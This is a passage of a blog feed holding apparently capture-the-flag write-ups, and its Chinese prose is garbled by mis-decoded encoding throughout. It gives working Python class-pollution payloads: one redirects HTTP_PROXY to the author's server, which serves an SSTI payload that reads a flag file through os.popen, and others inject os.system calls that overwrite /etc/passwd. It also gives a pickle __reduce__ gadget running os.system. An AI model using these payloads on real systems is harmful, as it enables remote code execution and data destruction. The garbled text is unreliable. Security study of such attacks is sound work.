·å°±åˆå¯ä»¥æƒ³åˆ°:</p><p>åˆ©ç”¨æ±¡æŸ“å‘useræ–‡ä»¶ä¸­æ’å…¥ä¸€ä¸ªæ¨¡æ¿å­—ç¬¦ä¸², å†æŠŠå®ƒè¯»å–å‡ºæ¥æ¸²æŸ“é€ æˆssti</p><p>ç”±äºæ²¡æœ‰å¯¼å…¥user,è¿™é‡Œå¹¶ä¸èƒ½ä¿®æ”¹userçš„å†…å®¹</p><p>åœ¨harderå­¦é•¿çš„æç¤ºä¸‹ å¼€å§‹å°è¯•æ±¡æŸ“http_proxyå˜é‡</p><h2 id="æ³•ä¸€-æ±¡æŸ“HTTP-PROXY"><a href="#æ³•ä¸€-æ±¡æŸ“HTTP-PROXY" class="headerlink" title="æ³•ä¸€(æ±¡æŸ“HTTP_PROXY)"></a>æ³•ä¸€(æ±¡æŸ“HTTP_PROXY)</h2><p>é¦–å…ˆæˆ‘ä»¬åœ¨vpsä¸Šè¿è¡Œä¸€ä¸ªä»£ç†(å½“ç„¶è¿™é‡Œæ˜¯æœ¬åœ°æµ‹è¯•, ä¹Ÿå¯ä»¥ä¸è¦vps), å°†æ¥æ”¶åˆ°çš„è¯·æ±‚ç›´æ¥è¿”å›ä¸€ä¸ªæ¨¡æ¿å­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&#123;7*7&#125;&#125;&#x27;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;192.168.1.11&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">8899</span>)</span><br></pre></td></tr></table></figure><p>ä¹‹åå¯¹HTTP_PROXYç¯å¢ƒå˜é‡è¿›è¡Œæ±¡æŸ“, ä½¿å¾—æ‰€æœ‰çš„httpè¯·æ±‚å…¨éƒ¨ä»£ç†åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Š</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;environ&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;HTTP_PROXY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://192.168.1.11:8899/&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å¼€å¯vpsè¿›è¡Œç›‘å¬</p><p>åœ¨æ­¤è°ƒç”¨searchçš„api</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302144331876.png" alt="image-20240302144331876"></p><p>å¯ä»¥çœ‹è§è¿™é‡Œè¿”å›49, æ­£æ˜¯æˆ‘ä»¬æ¨¡æ¿å­—ç¬¦ä¸²è¢«æ¸²æŸ“åçš„å€¼</p><p>ä¹‹åå°±æ˜¯sstiçš„åˆ©ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">path</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat /app/jW2SzsJM39euQ1sPj5JWpNRGcS1Etzbq_FLAG\&quot;).read()&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;%endfor%&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;192.168.1.11&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">8899</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302154000485.png" alt="image-20240302154000485"></p><h2 id="æ³•äºŒ-Flaskå˜é‡æ±¡æŸ“"><a href="#æ³•äºŒ-Flaskå˜é‡æ±¡æŸ“" class="headerlink" title="æ³•äºŒ(Flaskå˜é‡æ±¡æŸ“)"></a>æ³•äºŒ(Flaskå˜é‡æ±¡æŸ“)</h2><p>å‚è€ƒ:</p><p><a href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p><h3 id="spec-è·å–sys"><a href="#spec-è·å–sys" class="headerlink" title="__spec__è·å–sys"></a><code>__spec__</code>è·å–sys</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__spec__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                            <span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;echo 222 &gt; /etc/passwd&#x27;);#&quot;</span></span><br><span class="line">                                        <span class="punctuation">]</span></span><br><span class="line">                                    <span class="punctuation">&#125;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="loader-è·å–sys"><a href="#loader-è·å–sys" class="headerlink" title="__loader__è·å–sys"></a><code>__loader__</code>è·å–sys</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__loader__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                            <span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;echo 111 &gt; /etc/passwd&#x27;);#&quot;</span></span><br><span class="line">                                        <span class="punctuation">]</span></span><br><span class="line">                                    <span class="punctuation">&#125;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="æ³•ä¸‰-æ±¡æŸ“requestsæ¨¡å—çš„respone"><a href="#æ³•ä¸‰-æ±¡æŸ“requestsæ¨¡å—çš„respone" class="headerlink" title="æ³•ä¸‰(æ±¡æŸ“requestsæ¨¡å—çš„respone)"></a>æ³•ä¸‰(æ±¡æŸ“requestsæ¨¡å—çš„respone)</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;requests&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat /app/jW2SzsJM39euQ1sPj5JWpNRGcS1Etzbq_FLAG\&quot;).read()&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;%endfor%&#125;&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Swagger-docs&quot;&gt;&lt;a href=&quot;#Swagger-docs&quot; class=&quot;headerlink&quot; title=&quot;Swagger docs&quot;&gt;&lt;/a&gt;Swagger docs&lt;/h1&gt;&lt;p&gt;ä¸€è¿›å»æ˜¯ä¸€ä¸ªæ–‡æ¡£å†…å®¹, è¿˜ä»¥ä¸ºæ˜¯å®¹å™¨æ²¡å¼„å¥½&lt;/p&gt;
&lt;p&gt;ä»”</summary>
      
    
    
    
    
    <category term="Flaskå®¡è®¡" scheme="http://example.com/tags/Flask%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="ssti" scheme="http://example.com/tags/ssti/"/>
    
    <category term="PythonåŸå‹é“¾æ±¡æŸ“(ç±»æ±¡æŸ“)" scheme="http://example.com/tags/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>pickleååºåˆ—åŒ–</title>
    <link href="http://example.com/2024/02/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/02/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-02-28T08:10:51.000Z</published>
    <updated>2024-02-29T08:16:43.516Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pickleååºåˆ—åŒ–"><a href="#pickleååºåˆ—åŒ–" class="headerlink" title="pickleååºåˆ—åŒ–"></a>pickleååºåˆ—åŒ–</h1><p>åœ¨pyhtonä¸­ä¹Ÿå­˜åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ“ä½œ, ç”±pickleæ¨¡å—å®ç°</p><p>ä¸phpä¸­çš„<code>serialize()</code>å’Œ<code>unserialize()</code>ç›¸å¯¹åº”,åœ¨pythonä¸­ä¸º<code>pickle.dump()</code>å’Œ<code>pickle.load()</code></p><p>ç¤ºä¾‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;hello, world!&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;nacl&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(data, f) <span class="comment"># åºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f)) <span class="comment"># ååºåˆ—åŒ–</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#è¾“å‡º</span></span><br><span class="line"><span class="comment"># b&#x27;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00\x8c\rhello, world!\x94.&#x27;</span></span><br><span class="line"><span class="comment"># hello, world!</span></span><br></pre></td></tr></table></figure><blockquote><p>pickle.load()ç”¨äºä»æ–‡ä»¶ä¸­åŠ è½½åºåˆ—åŒ–çš„å¯¹è±¡</p><p>pickle.load()ä»å­—èŠ‚æµä¸­åŠ è½½åºåˆ—åŒ–çš„å¯¹è±¡</p><p>pickle.dump()å°†åºåˆ—åŒ–çš„äºŒè¿›åˆ¶æ•°æ®ä¿å­˜åˆ°æ–‡ä»¶</p><p>pickle.dumps()ç›´æ¥è¿”å›åºåˆ—åŒ–åçš„äºŒè¿›åˆ¶æµ</p></blockquote><h2 id="reduce-æ–¹æ³•"><a href="#reduce-æ–¹æ³•" class="headerlink" title="__reduce__æ–¹æ³•"></a><code>__reduce__</code>æ–¹æ³•</h2><blockquote><p><code>__reduce__</code><br>è°ƒç”¨:è¢«å®šä¹‰ä¹‹åï¼Œå½“å¯¹è±¡è¢«pickleæ—¶å°±ä¼šè§¦å‘<br>ä½œç”¨:å¦‚æœæ¥æ”¶åˆ°çš„æ˜¯å­—ç¬¦ä¸²ï¼Œå°±ä¼šæŠŠè¿™ä¸ªå­—ç¬¦ä¸²å½“æˆä¸€ä¸ªå…¨å±€å˜é‡çš„åç§°ï¼Œç„¶åPythonæŸ¥æ‰¾å®ƒå¹¶è¿›å»pickle<br>    å¦‚æœæ¥æ”¶åˆ°çš„æ˜¯å…ƒç»„ï¼Œè¿™ä¸ªå…ƒç»„åº”è¯¥åŒ…å«2-6ä¸ªå…ƒç´ ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼šä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œç”¨äºåˆ›å»ºå¯¹è±¡ï¼Œå‚æ•°å…ƒç´ ï¼Œä¾›å¯¹è±¡è°ƒç”¨</p></blockquote><p>ä¾‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">s = a() </span><br><span class="line">payload = pickle.dumps(s)</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure><p><strong>æ³¨: pickleååºåˆ—åŒ–åæ‰§è¡Œå‡½æ•°æ—¶ä¼šè‡ªåŠ¨å°è¯•å¯¼å…¥æœªå¯¼å…¥çš„æ¨¡å—, æ‰€ä»¥å³ä¾¿ç½‘ç«™åº”ç”¨å¹¶æ²¡æœ‰import os ä¹Ÿå¯ä»¥æ‰§è¡ŒæˆåŠŸ</strong></p><p>æ­¤æ—¶whoamiä¼šè¢«æ‰§è¡Œ,è¾¾åˆ°ç›®çš„,</p><p>å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡os.systemæ¥æ‰§è¡Œå‘½ä»¤åå¼¹shell</p><h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>opcodeå°±æ˜¯åºåˆ—åŒ–åçš„ç»“æœ, å®é™…ä¸Šå®ƒæ˜¯å°†å¯¹è±¡ç­‰å®ä¾‹åŒ–ä¸ºæŸç§æŒ‡ä»¤é›†çš„ç»“æœ, ä¾é PVMæ¥è§£æ</p><p>v0 ç‰ˆåè®®æ˜¯åŸå§‹çš„â€œäººç±»å¯è¯»â€åè®®ï¼Œå¹¶ä¸”å‘åå…¼å®¹æ—©æœŸç‰ˆæœ¬çš„ Python</p><p>ç”±äºå…¶å‘å‰å…¼å®¹çš„ç‰¹æ€§, æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨ç¼–å†™opcodeæŒ‡ä»¤, ååºåˆ—åŒ–å³å¯æ‰§è¡Œæ¶æ„è„šæœ¬</p><h2 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h2><p>PVMç”±ä»¥ä¸‹ä¸‰éƒ¨åˆ†ç»„æˆ</p><ul><li>æŒ‡ä»¤å¤„ç†å™¨ï¼šä»æµä¸­è¯»å– <code>opcode</code> å’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼Œç›´åˆ°é‡åˆ° . è¿™ä¸ªç»“æŸç¬¦ååœæ­¢ã€‚ æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚</li><li>stackï¼šç”± Python çš„ <strong><code>list</code></strong> å®ç°ï¼Œè¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ã€‚</li><li>memoï¼šç”± Python çš„ <strong><code>dict</code></strong> å®ç°ï¼Œä¸º PVM çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨ã€‚</li></ul><h2 id="å¸¸ç”¨çš„opcode"><a href="#å¸¸ç”¨çš„opcode" class="headerlink" title="å¸¸ç”¨çš„opcode"></a>å¸¸ç”¨çš„opcode</h2><table><thead><tr><th align="left">æŒ‡ä»¤</th><th align="left">æè¿°</th><th align="left">å…·ä½“å†™æ³•</th><th align="left">æ ˆä¸Šçš„å˜åŒ–</th></tr></thead><tbody><tr><td align="left">c</td><td align="left">è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—</td><td align="left">c[module]\n[instance]\n</td><td align="left">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">o</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td align="left">o</td><td align="left">è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td></tr><tr><td align="left">i</td><td align="left">ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td align="left">i[module]\n[callable]\n</td><td align="left">è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td></tr><tr><td align="left">N</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªNone</td><td align="left">N</td><td align="left">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">S</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</td><td align="left">Sâ€™xxxâ€™\nï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€&#39;ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰</td><td align="left">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">V</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡</td><td align="left">Vxxx\n</td><td align="left">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">I</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡</td><td align="left">Ixxx\n</td><td align="left">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">F</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡</td><td align="left">Fx.x\n</td><td align="left">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">R</td><td align="left">é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°</td><td align="left">R</td><td align="left">å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ</td></tr><tr><td align="left">.</td><td align="left">ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼</td><td align="left">.</td><td align="left">æ— </td></tr><tr><td align="left">(</td><td align="left">å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®°</td><td align="left">(</td><td align="left">MARKæ ‡è®°å…¥æ ˆ</td></tr><tr><td align="left">t</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„</td><td align="left">t</td><td align="left">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">)</td><td align="left">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„</td><td align="left">)</td><td align="left">ç©ºå…ƒç»„å…¥æ ˆ</td></tr><tr><td align="left">l</td><td align="left">å¯»æ‰¾æ 